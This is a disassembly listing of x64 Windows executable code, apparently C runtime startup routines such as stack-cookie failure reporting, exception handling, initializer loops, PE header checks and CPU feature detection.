   140001e3c:	48 8d 05 5d 3b 01 00 	lea    0x13b5d(%rip),%rax        # 0x1400159a0
   140001e43:	c3                   	ret
   140001e44:	48 8d 05 5d 3b 01 00 	lea    0x13b5d(%rip),%rax        # 0x1400159a8
   140001e4b:	c3                   	ret
   140001e4c:	48 83 ec 28          	sub    $0x28,%rsp
   140001e50:	e8 e7 ff ff ff       	call   0x140001e3c
   140001e55:	48 83 08 04          	orq    $0x4,(%rax)
   140001e59:	e8 e6 ff ff ff       	call   0x140001e44
   140001e5e:	48 83 08 02          	orq    $0x2,(%rax)
   140001e62:	48 83 c4 28          	add    $0x28,%rsp
   140001e66:	c3                   	ret
   140001e67:	90                   	nop
   140001e68:	33 c0                	xor    %eax,%eax
   140001e6a:	39 05 b8 31 01 00    	cmp    %eax,0x131b8(%rip)        # 0x140015028
   140001e70:	0f 94 c0             	sete   %al
   140001e73:	c3                   	ret
   140001e74:	48 8d 05 4d 4c 01 00 	lea    0x14c4d(%rip),%rax        # 0x140016ac8
   140001e7b:	c3                   	ret
   140001e7c:	48 8d 05 3d 4c 01 00 	lea    0x14c3d(%rip),%rax        # 0x140016ac0
   140001e83:	c3                   	ret
   140001e84:	83 25 25 3b 01 00 00 	andl   $0x0,0x13b25(%rip)        # 0x1400159b0
   140001e8b:	c3                   	ret
   140001e8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e91:	55                   	push   %rbp
   140001e92:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140001e99:	ff 
   140001e9a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140001ea1:	8b d9                	mov    %ecx,%ebx
   140001ea3:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001ea8:	e8 a7 94 00 00       	call   0x14000b354
   140001ead:	85 c0                	test   %eax,%eax
   140001eaf:	74 04                	je     0x140001eb5
   140001eb1:	8b cb                	mov    %ebx,%ecx
   140001eb3:	cd 29                	int    $0x29
   140001eb5:	83 25 f4 3a 01 00 00 	andl   $0x0,0x13af4(%rip)        # 0x1400159b0
   140001ebc:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001ec0:	33 d2                	xor    %edx,%edx
   140001ec2:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140001ec8:	e8 f3 08 00 00       	call   0x1400027c0
   140001ecd:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001ed1:	ff 15 c9 a1 00 00    	call   *0xa1c9(%rip)        # 0x14000c0a0
   140001ed7:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140001ede:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140001ee5:	48 8b cb             	mov    %rbx,%rcx
   140001ee8:	45 33 c0             	xor    %r8d,%r8d
   140001eeb:	ff 15 b7 a1 00 00    	call   *0xa1b7(%rip)        # 0x14000c0a8
   140001ef1:	48 85 c0             	test   %rax,%rax
   140001ef4:	74 3c                	je     0x140001f32
   140001ef6:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001efc:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140001f03:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140001f0a:	4c 8b c8             	mov    %rax,%r9
   140001f0d:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001f12:	4c 8b c3             	mov    %rbx,%r8
   140001f15:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140001f1c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001f21:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001f25:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001f2a:	33 c9                	xor    %ecx,%ecx
   140001f2c:	ff 15 7e a1 00 00    	call   *0xa17e(%rip)        # 0x14000c0b0
   140001f32:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001f39:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f3e:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140001f45:	33 d2                	xor    %edx,%edx
   140001f47:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140001f4e:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140001f54:	48 83 c0 08          	add    $0x8,%rax
   140001f58:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140001f5f:	e8 5c 08 00 00       	call   0x1400027c0
   140001f64:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001f6b:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001f70:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140001f77:	40 
   140001f78:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140001f7f:	00 
   140001f80:	ff 15 32 a1 00 00    	call   *0xa132(%rip)        # 0x14000c0b8
   140001f86:	83 f8 01             	cmp    $0x1,%eax
   140001f89:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001f8e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001f93:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140001f97:	0f 94 c3             	sete   %bl
   140001f9a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001f9f:	33 c9                	xor    %ecx,%ecx
   140001fa1:	ff 15 21 a1 00 00    	call   *0xa121(%rip)        # 0x14000c0c8
   140001fa7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001fac:	ff 15 0e a1 00 00    	call   *0xa10e(%rip)        # 0x14000c0c0
   140001fb2:	85 c0                	test   %eax,%eax
   140001fb4:	75 0a                	jne    0x140001fc0
   140001fb6:	f6 db                	neg    %bl
   140001fb8:	1b c0                	sbb    %eax,%eax
   140001fba:	21 05 f0 39 01 00    	and    %eax,0x139f0(%rip)        # 0x1400159b0
   140001fc0:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140001fc7:	00 
   140001fc8:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140001fcf:	5d                   	pop    %rbp
   140001fd0:	c3                   	ret
   140001fd1:	90                   	nop
   140001fd2:	90                   	nop
   140001fd3:	90                   	nop
   140001fd4:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140001fdb:	33 d2                	xor    %edx,%edx
   140001fdd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001fe2:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140001fe6:	e8 d5 07 00 00       	call   0x1400027c0
   140001feb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001ff0:	ff 15 da a0 00 00    	call   *0xa0da(%rip)        # 0x14000c0d0
   140001ff6:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   140001ffa:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001fff:	0f b7 4c 24 60       	movzwl 0x60(%rsp),%ecx
   140002004:	80 e2 01             	and    $0x1,%dl
   140002007:	0f 45 c1             	cmovne %ecx,%eax
   14000200a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140002011:	c3                   	ret
   140002012:	90                   	nop
   140002013:	90                   	nop
   140002014:	33 c0                	xor    %eax,%eax
   140002016:	c3                   	ret
   140002017:	90                   	nop
   140002018:	48 83 ec 28          	sub    $0x28,%rsp
   14000201c:	33 c9                	xor    %ecx,%ecx
   14000201e:	ff 15 bc a0 00 00    	call   *0xa0bc(%rip)        # 0x14000c0e0
   140002024:	48 8b c8             	mov    %rax,%rcx
   140002027:	48 85 c0             	test   %rax,%rax
   14000202a:	75 04                	jne    0x140002030
   14000202c:	32 c0                	xor    %al,%al
   14000202e:	eb 37                	jmp    0x140002067
   140002030:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140002035:	66 39 01             	cmp    %ax,(%rcx)
   140002038:	75 f2                	jne    0x14000202c
   14000203a:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000203e:	48 03 c1             	add    %rcx,%rax
   140002041:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002047:	75 e3                	jne    0x14000202c
   140002049:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000204e:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140002052:	75 d8                	jne    0x14000202c
   140002054:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   14000205b:	76 cf                	jbe    0x14000202c
   14000205d:	83 b8 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rax)
   140002064:	0f 95 c0             	setne  %al
   140002067:	48 83 c4 28          	add    $0x28,%rsp
   14000206b:	c3                   	ret
   14000206c:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x14000207c
   140002073:	48 ff 25 4e a0 00 00 	rex.W jmp *0xa04e(%rip)        # 0x14000c0c8
   14000207a:	90                   	nop
   14000207b:	90                   	nop
   14000207c:	48 83 ec 28          	sub    $0x28,%rsp
   140002080:	48 8b 01             	mov    (%rcx),%rax
   140002083:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   140002089:	75 1c                	jne    0x1400020a7
   14000208b:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000208f:	75 16                	jne    0x1400020a7
   140002091:	8b 48 20             	mov    0x20(%rax),%ecx
   140002094:	8d 81 e0 fa 6c e6    	lea    -0x19930520(%rcx),%eax
   14000209a:	83 f8 02             	cmp    $0x2,%eax
   14000209d:	76 0f                	jbe    0x1400020ae
   14000209f:	81 f9 00 40 99 01    	cmp    $0x1994000,%ecx
   1400020a5:	74 07                	je     0x1400020ae
   1400020a7:	33 c0                	xor    %eax,%eax
   1400020a9:	48 83 c4 28          	add    $0x28,%rsp
   1400020ad:	c3                   	ret
   1400020ae:	e8 05 26 00 00       	call   0x1400046b8
   1400020b3:	cc                   	int3
   1400020b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020b9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400020be:	57                   	push   %rdi
   1400020bf:	48 83 ec 20          	sub    $0x20,%rsp
   1400020c3:	48 8d 1d 2e 0d 01 00 	lea    0x10d2e(%rip),%rbx        # 0x140012df8
   1400020ca:	48 8d 35 27 0d 01 00 	lea    0x10d27(%rip),%rsi        # 0x140012df8
   1400020d1:	eb 16                	jmp    0x1400020e9
   1400020d3:	48 8b 3b             	mov    (%rbx),%rdi
   1400020d6:	48 85 ff             	test   %rdi,%rdi
   1400020d9:	74 0a                	je     0x1400020e5
   1400020db:	48 8b cf             	mov    %rdi,%rcx
   1400020de:	e8 69 00 00 00       	call   0x14000214c
   1400020e3:	ff d7                	call   *%rdi
   1400020e5:	48 83 c3 08          	add    $0x8,%rbx
   1400020e9:	48 3b de             	cmp    %rsi,%rbx
   1400020ec:	72 e5                	jb     0x1400020d3
   1400020ee:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400020f3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400020f8:	48 83 c4 20          	add    $0x20,%rsp
   1400020fc:	5f                   	pop    %rdi
   1400020fd:	c3                   	ret
   1400020fe:	90                   	nop
   1400020ff:	90                   	nop
   140002100:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002105:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000210a:	57                   	push   %rdi
   14000210b:	48 83 ec 20          	sub    $0x20,%rsp
   14000210f:	48 8d 1d f2 0c 01 00 	lea    0x10cf2(%rip),%rbx        # 0x140012e08
   140002116:	48 8d 35 eb 0c 01 00 	lea    0x10ceb(%rip),%rsi        # 0x140012e08
   14000211d:	eb 16                	jmp    0x140002135
   14000211f:	48 8b 3b             	mov    (%rbx),%rdi
   140002122:	48 85 ff             	test   %rdi,%rdi
   140002125:	74 0a                	je     0x140002131
   140002127:	48 8b cf             	mov    %rdi,%rcx
   14000212a:	e8 1d 00 00 00       	call   0x14000214c
   14000212f:	ff d7                	call   *%rdi
   140002131:	48 83 c3 08          	add    $0x8,%rbx
   140002135:	48 3b de             	cmp    %rsi,%rbx
   140002138:	72 e5                	jb     0x14000211f
   14000213a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000213f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002144:	48 83 c4 20          	add    $0x20,%rsp
   140002148:	5f                   	pop    %rdi
   140002149:	c3                   	ret
   14000214a:	90                   	nop
   14000214b:	90                   	nop
   14000214c:	48 ff 25 35 a1 00 00 	rex.W jmp *0xa135(%rip)        # 0x14000c288
   140002153:	90                   	nop
   140002154:	53                   	push   %rbx
   140002155:	48 83 ec 20          	sub    $0x20,%rsp
   140002159:	48 8b d9             	mov    %rcx,%rbx
   14000215c:	33 c9                	xor    %ecx,%ecx
   14000215e:	ff 15 64 9f 00 00    	call   *0x9f64(%rip)        # 0x14000c0c8
   140002164:	48 8b cb             	mov    %rbx,%rcx
   140002167:	ff 15 53 9f 00 00    	call   *0x9f53(%rip)        # 0x14000c0c0
   14000216d:	ff 15 75 9f 00 00    	call   *0x9f75(%rip)        # 0x14000c0e8
   140002173:	48 8b c8             	mov    %rax,%rcx
   140002176:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000217b:	48 83 c4 20          	add    $0x20,%rsp
   14000217f:	5b                   	pop    %rbx
   140002180:	48 ff 25 69 9f 00 00 	rex.W jmp *0x9f69(%rip)        # 0x14000c0f0
   140002187:	90                   	nop
   140002188:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000218d:	48 83 ec 38          	sub    $0x38,%rsp
   140002191:	b9 17 00 00 00       	mov    $0x17,%ecx
   140002196:	e8 b9 91 00 00       	call   0x14000b354
   14000219b:	85 c0                	test   %eax,%eax
   14000219d:	74 07                	je     0x1400021a6
   14000219f:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400021a4:	cd 29                	int    $0x29
   1400021a6:	48 8d 0d b3 38 01 00 	lea    0x138b3(%rip),%rcx        # 0x140015a60
   1400021ad:	e8 ca 01 00 00       	call   0x14000237c
   1400021b2:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400021b7:	48 89 05 9a 39 01 00 	mov    %rax,0x1399a(%rip)        # 0x140015b58
   1400021be:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400021c3:	48 83 c0 08          	add    $0x8,%rax
   1400021c7:	48 89 05 2a 39 01 00 	mov    %rax,0x1392a(%rip)        # 0x140015af8
   1400021ce:	48 8b 05 83 39 01 00 	mov    0x13983(%rip),%rax        # 0x140015b58
   1400021d5:	48 89 05 f4 37 01 00 	mov    %rax,0x137f4(%rip)        # 0x1400159d0
   1400021dc:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400021e1:	48 89 05 f8 38 01 00 	mov    %rax,0x138f8(%rip)        # 0x140015ae0
   1400021e8:	c7 05 ce 37 01 00 09 	movl   $0xc0000409,0x137ce(%rip)        # 0x1400159c0
   1400021ef:	04 00 c0 
   1400021f2:	c7 05 c8 37 01 00 01 	movl   $0x1,0x137c8(%rip)        # 0x1400159c4
   1400021f9:	00 00 00 
   1400021fc:	c7 05 d2 37 01 00 01 	movl   $0x1,0x137d2(%rip)        # 0x1400159d8
   140002203:	00 00 00 
   140002206:	b8 08 00 00 00       	mov    $0x8,%eax
   14000220b:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000220f:	48 8d 0d ca 37 01 00 	lea    0x137ca(%rip),%rcx        # 0x1400159e0
   140002216:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000221d:	00 
   14000221e:	b8 08 00 00 00       	mov    $0x8,%eax
   140002223:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140002227:	48 8b 0d ea 2d 01 00 	mov    0x12dea(%rip),%rcx        # 0x140015018
   14000222e:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140002233:	b8 08 00 00 00       	mov    $0x8,%eax
   140002238:	48 6b c0 01          	imul   $0x1,%rax,%rax
   14000223c:	48 8b 0d dd 2d 01 00 	mov    0x12ddd(%rip),%rcx        # 0x140015020
   140002243:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140002248:	48 8d 0d 59 a1 00 00 	lea    0xa159(%rip),%rcx        # 0x14000c3a8
   14000224f:	e8 00 ff ff ff       	call   0x140002154
   140002254:	48 83 c4 38          	add    $0x38,%rsp
   140002258:	c3                   	ret
   140002259:	90                   	nop
   14000225a:	90                   	nop
   14000225b:	90                   	nop
   14000225c:	48 83 ec 28          	sub    $0x28,%rsp
   140002260:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002265:	e8 06 00 00 00       	call   0x140002270
   14000226a:	48 83 c4 28          	add    $0x28,%rsp
   14000226e:	c3                   	ret
   14000226f:	90                   	nop
   140002270:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002274:	48 83 ec 28          	sub    $0x28,%rsp
   140002278:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000227d:	e8 d2 90 00 00       	call   0x14000b354
   140002282:	85 c0                	test   %eax,%eax
   140002284:	74 08                	je     0x14000228e
   140002286:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000228a:	8b c8                	mov    %eax,%ecx
   14000228c:	cd 29                	int    $0x29
   14000228e:	48 8d 0d cb 37 01 00 	lea    0x137cb(%rip),%rcx        # 0x140015a60
   140002295:	e8 72 00 00 00       	call   0x14000230c
   14000229a:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000229f:	48 89 05 b2 38 01 00 	mov    %rax,0x138b2(%rip)        # 0x140015b58
   1400022a6:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   1400022ab:	48 83 c0 08          	add    $0x8,%rax
   1400022af:	48 89 05 42 38 01 00 	mov    %rax,0x13842(%rip)        # 0x140015af8
   1400022b6:	48 8b 05 9b 38 01 00 	mov    0x1389b(%rip),%rax        # 0x140015b58
   1400022bd:	48 89 05 0c 37 01 00 	mov    %rax,0x1370c(%rip)        # 0x1400159d0
   1400022c4:	c7 05 f2 36 01 00 09 	movl   $0xc0000409,0x136f2(%rip)        # 0x1400159c0
   1400022cb:	04 00 c0 
   1400022ce:	c7 05 ec 36 01 00 01 	movl   $0x1,0x136ec(%rip)        # 0x1400159c4
   1400022d5:	00 00 00 
   1400022d8:	c7 05 f6 36 01 00 01 	movl   $0x1,0x136f6(%rip)        # 0x1400159d8
   1400022df:	00 00 00 
   1400022e2:	b8 08 00 00 00       	mov    $0x8,%eax
   1400022e7:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400022eb:	48 8d 0d ee 36 01 00 	lea    0x136ee(%rip),%rcx        # 0x1400159e0
   1400022f2:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400022f6:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400022fa:	48 8d 0d a7 a0 00 00 	lea    0xa0a7(%rip),%rcx        # 0x14000c3a8
   140002301:	e8 4e fe ff ff       	call   0x140002154
   140002306:	48 83 c4 28          	add    $0x28,%rsp
   14000230a:	c3                   	ret
   14000230b:	90                   	nop
   14000230c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002311:	57                   	push   %rdi
   140002312:	48 83 ec 40          	sub    $0x40,%rsp
   140002316:	48 8b d9             	mov    %rcx,%rbx
   140002319:	ff 15 81 9d 00 00    	call   *0x9d81(%rip)        # 0x14000c0a0
   14000231f:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   140002326:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000232b:	48 8b cf             	mov    %rdi,%rcx
   14000232e:	45 33 c0             	xor    %r8d,%r8d
   140002331:	ff 15 71 9d 00 00    	call   *0x9d71(%rip)        # 0x14000c0a8
   140002337:	48 85 c0             	test   %rax,%rax
   14000233a:	74 32                	je     0x14000236e
   14000233c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002342:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002347:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   14000234c:	4c 8b c8             	mov    %rax,%r9
   14000234f:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002354:	4c 8b c7             	mov    %rdi,%r8
   140002357:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000235c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002361:	33 c9                	xor    %ecx,%ecx
   140002363:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002368:	ff 15 42 9d 00 00    	call   *0x9d42(%rip)        # 0x14000c0b0
   14000236e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140002373:	48 83 c4 40          	add    $0x40,%rsp
   140002377:	5f                   	pop    %rdi
   140002378:	c3                   	ret
   140002379:	90                   	nop
   14000237a:	90                   	nop
   14000237b:	90                   	nop
   14000237c:	53                   	push   %rbx
   14000237d:	56                   	push   %rsi
   14000237e:	57                   	push   %rdi
   14000237f:	48 83 ec 40          	sub    $0x40,%rsp
   140002383:	48 8b d9             	mov    %rcx,%rbx
   140002386:	ff 15 14 9d 00 00    	call   *0x9d14(%rip)        # 0x14000c0a0
   14000238c:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140002393:	33 ff                	xor    %edi,%edi
   140002395:	45 33 c0             	xor    %r8d,%r8d
   140002398:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000239d:	48 8b ce             	mov    %rsi,%rcx
   1400023a0:	ff 15 02 9d 00 00    	call   *0x9d02(%rip)        # 0x14000c0a8
   1400023a6:	48 85 c0             	test   %rax,%rax
   1400023a9:	74 39                	je     0x1400023e4
   1400023ab:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400023b1:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400023b6:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400023bb:	4c 8b c8             	mov    %rax,%r9
   1400023be:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400023c3:	4c 8b c6             	mov    %rsi,%r8
   1400023c6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400023cb:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400023d0:	33 c9                	xor    %ecx,%ecx
   1400023d2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400023d7:	ff 15 d3 9c 00 00    	call   *0x9cd3(%rip)        # 0x14000c0b0
   1400023dd:	ff c7                	inc    %edi
   1400023df:	83 ff 02             	cmp    $0x2,%edi
   1400023e2:	7c b1                	jl     0x140002395
   1400023e4:	48 83 c4 40          	add    $0x40,%rsp
   1400023e8:	5f                   	pop    %rdi
   1400023e9:	5e                   	pop    %rsi
   1400023ea:	5b                   	pop    %rbx
   1400023eb:	c3                   	ret
   1400023ec:	90                   	nop
   1400023ed:	90                   	nop
   1400023ee:	90                   	nop
   1400023ef:	90                   	nop
   1400023f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400023f5:	55                   	push   %rbp
   1400023f6:	48 8b ec             	mov    %rsp,%rbp
   1400023f9:	48 83 ec 20          	sub    $0x20,%rsp
   1400023fd:	83 65 e8 00          	andl   $0x0,-0x18(%rbp)
   140002401:	33 c9                	xor    %ecx,%ecx
   140002403:	33 c0                	xor    %eax,%eax
   140002405:	c7 05 21 2c 01 00 02 	movl   $0x2,0x12c21(%rip)        # 0x140015030
   14000240c:	00 00 00 
   14000240f:	0f a2                	cpuid
   140002411:	44 8b c1             	mov    %ecx,%r8d
   140002414:	c7 05 0e 2c 01 00 01 	movl   $0x1,0x12c0e(%rip)        # 0x14001502c
   14000241b:	00 00 00 
   14000241e:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140002425:	44 8b ca             	mov    %edx,%r9d
   140002428:	41 81 f1 69 6e 65 49 	xor    $0x49656e69,%r9d
   14000242f:	44 8b d2             	mov    %edx,%r10d
   140002432:	45 0b c8             	or     %r8d,%r9d
   140002435:	8b d3                	mov    %ebx,%edx
   140002437:	81 f2 47 65 6e 75    	xor    $0x756e6547,%edx
   14000243d:	44 8b d8             	mov    %eax,%r11d
   140002440:	44 0b ca             	or     %edx,%r9d
   140002443:	b8 01 00 00 00       	mov    $0x1,%eax
   140002448:	41 0f 94 c0          	sete   %r8b
   14000244c:	81 f1 63 41 4d 44    	xor    $0x444d4163,%ecx
   140002452:	81 f3 41 75 74 68    	xor    $0x68747541,%ebx
   140002458:	41 81 f2 65 6e 74 69 	xor    $0x69746e65,%r10d
   14000245f:	41 0b da             	or     %r10d,%ebx
   140002462:	0b d9                	or     %ecx,%ebx
   140002464:	41 0f 94 c2          	sete   %r10b
   140002468:	33 c9                	xor    %ecx,%ecx
   14000246a:	0f a2                	cpuid
   14000246c:	44 8b c9             	mov    %ecx,%r9d
   14000246f:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140002472:	45 84 c0             	test   %r8b,%r8b
   140002475:	44 89 4d f8          	mov    %r9d,-0x8(%rbp)
   140002479:	44 8b 05 b0 3a 01 00 	mov    0x13ab0(%rip),%r8d        # 0x140015f30
   140002480:	8b c8                	mov    %eax,%ecx
   140002482:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140002485:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140002488:	74 52                	je     0x1400024dc
   14000248a:	48 83 0d a6 2b 01 00 	orq    $0xffffffffffffffff,0x12ba6(%rip)        # 0x140015038
   140002491:	ff 
   140002492:	41 83 c8 04          	or     $0x4,%r8d
   140002496:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000249b:	44 89 05 8e 3a 01 00 	mov    %r8d,0x13a8e(%rip)        # 0x140015f30
   1400024a2:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1400024a7:	74 28                	je     0x1400024d1
   1400024a9:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1400024ae:	74 21                	je     0x1400024d1
   1400024b0:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1400024b5:	74 1a                	je     0x1400024d1
   1400024b7:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1400024bc:	83 f8 20             	cmp    $0x20,%eax
   1400024bf:	77 1b                	ja     0x1400024dc
   1400024c1:	48 bb 01 00 01 00 01 	movabs $0x100010001,%rbx
   1400024c8:	00 00 00 
   1400024cb:	48 0f a3 c3          	bt     %rax,%rbx
   1400024cf:	73 0b                	jae    0x1400024dc
   1400024d1:	41 83 c8 01          	or     $0x1,%r8d
   1400024d5:	44 89 05 54 3a 01 00 	mov    %r8d,0x13a54(%rip)        # 0x140015f30
   1400024dc:	45 84 d2             	test   %r10b,%r10b
   1400024df:	74 19                	je     0x1400024fa
   1400024e1:	81 e1 00 0f f0 0f    	and    $0xff00f00,%ecx
   1400024e7:	81 f9 00 0f 60 00    	cmp    $0x600f00,%ecx
   1400024ed:	7c 0b                	jl     0x1400024fa
   1400024ef:	41 83 c8 04          	or     $0x4,%r8d
   1400024f3:	44 89 05 36 3a 01 00 	mov    %r8d,0x13a36(%rip)        # 0x140015f30
   1400024fa:	b8 07 00 00 00       	mov    $0x7,%eax
   1400024ff:	89 55 e0             	mov    %edx,-0x20(%rbp)
   140002502:	44 89 4d e4          	mov    %r9d,-0x1c(%rbp)
   140002506:	44 3b d8             	cmp    %eax,%r11d
   140002509:	7c 24                	jl     0x14000252f
   14000250b:	33 c9                	xor    %ecx,%ecx
   14000250d:	0f a2                	cpuid
   14000250f:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140002512:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140002515:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140002518:	89 55 fc             	mov    %edx,-0x4(%rbp)
   14000251b:	89 5d e8             	mov    %ebx,-0x18(%rbp)
   14000251e:	0f ba e3 09          	bt     $0x9,%ebx
   140002522:	73 0b                	jae    0x14000252f
   140002524:	41 83 c8 02          	or     $0x2,%r8d
   140002528:	44 89 05 01 3a 01 00 	mov    %r8d,0x13a01(%rip)        # 0x140015f30
   14000252f:	41 0f ba e1 14       	bt     $0x14,%r9d
   140002534:	73 6e                	jae    0x1400025a4
   140002536:	c7 05 ec 2a 01 00 02 	movl   $0x2,0x12aec(%rip)        # 0x14001502c
   14000253d:	00 00 00 
   140002540:	c7 05 e6 2a 01 00 06 	movl   $0x6,0x12ae6(%rip)        # 0x140015030
   140002547:	00 00 00 
   14000254a:	41 0f ba e1 1b       	bt     $0x1b,%r9d
   14000254f:	73 53                	jae    0x1400025a4
   140002551:	41 0f ba e1 1c       	bt     $0x1c,%r9d
   140002556:	73 4c                	jae    0x1400025a4
   140002558:	33 c9                	xor    %ecx,%ecx
   14000255a:	0f 01 d0             	xgetbv
   14000255d:	48 c1 e2 20          	shl    $0x20,%rdx
   140002561:	48 0b d0             	or     %rax,%rdx
   140002564:	48 89 55 10          	mov    %rdx,0x10(%rbp)
   140002568:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000256c:	24 06                	and    $0x6,%al
   14000256e:	3c 06                	cmp    $0x6,%al
   140002570:	75 32                	jne    0x1400025a4
   140002572:	8b 05 b8 2a 01 00    	mov    0x12ab8(%rip),%eax        # 0x140015030
   140002578:	83 c8 08             	or     $0x8,%eax
   14000257b:	c7 05 a7 2a 01 00 03 	movl   $0x3,0x12aa7(%rip)        # 0x14001502c
   140002582:	00 00 00 
   140002585:	f6 45 e8 20          	testb  $0x20,-0x18(%rbp)
   140002589:	89 05 a1 2a 01 00    	mov    %eax,0x12aa1(%rip)        # 0x140015030
